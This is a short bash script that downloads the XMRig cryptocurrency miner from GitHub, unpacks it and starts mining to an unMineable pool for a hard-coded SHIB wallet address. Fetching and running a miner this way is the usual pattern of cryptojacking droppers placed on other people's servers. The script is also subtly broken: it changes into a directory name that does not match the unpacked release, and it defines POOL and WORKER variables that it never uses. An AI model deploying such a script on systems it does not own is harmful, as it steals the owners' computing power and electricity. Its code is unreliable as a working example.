#!/bin/bash
POOL=ethash.unmineable.com:3333
WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
cd xmrig-6.12
./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u SHIB:0x663e23e815ff1720b42e223f757fb245d97fbc41
